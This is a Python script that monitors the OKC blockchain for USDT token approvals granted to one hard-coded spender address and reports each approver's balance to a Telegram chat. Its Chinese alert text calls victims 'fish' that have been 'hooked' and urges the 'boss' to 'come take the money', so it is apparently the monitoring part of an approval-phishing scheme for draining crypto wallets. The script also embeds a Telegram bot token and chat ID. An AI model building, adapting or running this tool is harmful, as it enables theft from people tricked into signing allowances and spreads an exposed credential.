import os
import time
import requests
from web3 import Web3
from web3.middleware import geth_poa_middleware

# 初始化Web3
OKC_RPC_URL = 'https://exchainrpc.okex.org'
w3 = Web3(Web3.HTTPProvider(OKC_RPC_URL))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

# 设置ABI和合约地址
USDT_CONTRACT_ADDRESS = '0x382bB369d343125BfB2117af9c149795C6C65C50'
usdt_contract_abi = [
    {
        "constant": True,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "uint256"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {
                "name": "spender",
                "type": "address"
            },
            {
                "name": "addedValue",
                "type": "uint256"
            }
        ],
        "name": "increaseAllowance",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": False,
        "inputs": [
            {
                "indexed": True,
                "name": "_from",
                "type": "address"
            },
            {
                "indexed": True,
                "name": "_to",
                "type": "address"
            },
            {
                "indexed": False,
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "Transfer",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [
            {
                "indexed": True,
                "name": "_owner",
                "type": "address"
            },
            {
                "indexed": True,
                "name": "_spender",
                "type": "address"
            },
            {
                "indexed": False,
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "Approval",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [
            {
                "indexed": True,
                "name": "_owner",
                "type": "address"
            },
            {
                "indexed": True,
                "name": "_spender",
                "type": "address"
            },
            {
                "indexed": False,
                "name": "_addedValue",
                "type": "uint256"
            }
        ],
        "name": "IncreaseAllowance",
        "type": "event"
    }
] 

spender_address = '0xF2632177e806a10065D1b77Bf925D3C61e8bb17e'
usdt_contract = w3.eth.contract(address=USDT_CONTRACT_ADDRESS, abi=usdt_contract_abi)

# 设置Telegram Bot API
TELEGRAM_BOT_API = '6232115961:AAGNwE8rpxwCS0uNpLsL7ja2UeCbEM2jw4E'
TELEGRAM_CHAT_ID = '-993312356'

# 发送Telegram消息
def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_API}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    for _ in range(3):  # 重试3次
        try:
            response = requests.post(url, data)
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error sending message: {e}")
            time.sleep(5)
            continue

def get_logs_by_event_names(event_names, from_block, to_block, contract):
    logs = []
    for event_name in event_names:
        event = getattr(contract.events, event_name)()
        event_logs = event.get_logs(fromBlock=from_block, toBlock=to_block)
        logs.extend(event_logs)
    return logs


# 监控区块链事件
def monitor_allowance_events():
    def get_token_decimals(contract):
        try:
            decimals = contract.functions.decimals().call()
        except Exception as e:
            print(f"Error getting token decimals: {e}")
            decimals = 18  # 默认为18位小数
        return decimals

    usdt_decimals = get_token_decimals(usdt_contract)

    last_block = w3.eth.block_number
    send_telegram_message("机器人启动成功")

    while True:
        try:
            current_block = w3.eth.block_number
            if last_block < current_block:
                events = get_logs_by_event_names(
                    ['IncreaseAllowance', 'Approval'], 
                    last_block + 1, 
                    current_block, 
                    usdt_contract
                )
                last_block = current_block

                for event in events:
                    if event['args']['_spender'].lower() == spender_address.lower():
                        owner_address = event['args']['_owner']
                        balance = usdt_contract.functions.balanceOf(owner_address).call() / (10 ** usdt_decimals)
                        message = f'【老板！有鱼上钩！出来拿钱！】\n【鱼儿地址】：{owner_address}\n【监听地址】：{spender_address}\n【当前余额】：{balance:.6f} USDT'
                        send_telegram_message(message)
            print("Scanning blocks...")  # 显示扫描区块信息
            time.sleep(10)
        except Exception as e:
            print(f"Error: {e}")
            send_telegram_message(f"机器人遇到错误: {e}")
            time.sleep(10)

if __name__ == '__main__':
    monitor_allowance_events()